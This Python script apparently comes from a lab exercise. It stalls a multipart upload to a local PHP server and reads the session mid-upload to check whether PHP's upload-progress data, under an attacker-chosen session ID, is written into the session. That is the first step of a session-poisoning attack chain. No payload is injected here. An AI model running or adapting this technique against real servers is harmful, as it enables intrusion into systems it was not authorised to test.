#!/usr/bin/env python3
"""Live check: hold a stalled multipart upload open; read the session from a
second request mid-upload. Proves whether upload_progress machinery is active."""
import sys, socket, time, uuid, threading
B = b'B7kQpoc618'
CR, LF = bytes([13]), bytes([10])
CRLF = CR + LF

def part(name, val, fn=None):
    d = f'Content-Disposition: form-data; name="{name}"'
    if fn is not None:
        d += f'; filename="{fn}"'
    return b'--' + B + CRLF + d.encode() + CRLF + CRLF + val + CRLF

def head(body_len, sid):
    return (f'POST / HTTP/1.1{CRLF.decode("latin1")}Host: h{CRLF.decode("latin1")}'
            f'Cookie: PHPSESSID={sid}{CRLF.decode("latin1")}'
            f'Content-Type: multipart/form-data; boundary={B.decode()}{CRLF.decode("latin1")}'
            f'Content-Length: {body_len}{CRLF.decode("latin1")}'
            f'Connection: close{CRLF.decode("latin1")}{CRLF.decode("latin1")}').encode('latin1')

def get(sid, path='/lab2.php?k=x'):
    s = socket.create_connection(('127.0.0.1', 8080), timeout=15)
    s.sendall((f'GET {path} HTTP/1.1{CRLF.decode("latin1")}Host: h{CRLF.decode("latin1")}'
               f'Cookie: PHPSESSID={sid}{CRLF.decode("latin1")}'
               f'Connection: close{CRLF.decode("latin1")}{CRLF.decode("latin1")}').encode())
    s.settimeout(10)
    out = b''
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return out

def main():
    sid = 'live' + uuid.uuid4().hex[:27]
    pre = (part('PHPSESSID', sid.encode()) + CRLF
           + part('PHP_SESSION_UPLOAD_PROGRESS', b'x') + CRLF
           + part('f', b'', 'a') + CRLF)
    c1 = b'A' * 5184
    rest = b'B' * 5184 + CRLF + b'--' + B + b'--' + CRLF
    body_len = len(pre) + len(c1) + len(rest)
    s = socket.create_connection(('127.0.0.1', 8080), timeout=30)
    s.sendall(head(body_len, sid) + pre + c1)
    print('[*] phase1 sent, upload stalled open', flush=True)
    for i in range(4):
        time.sleep(1.2)
        resp = get(sid)
        body = resp.split(b'\r\n\r\n', 1)[-1] if resp else b'NO-RESPONSE'
        print(f'--- mid-upload read {i+1} ---')
        print(body.decode('latin1', 'replace')[:800])
    try:
        s.sendall(rest)
    except OSError:
        print('[!] tail send failed (worker died?)', flush=True)
    s.settimeout(8)
    out = b''
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    print('--- final response of upload request ---')
    print((out.split(b'\r\n\r\n', 1)[-1]).decode('latin1', 'replace')[:800])

if __name__ == '__main__':
    main()
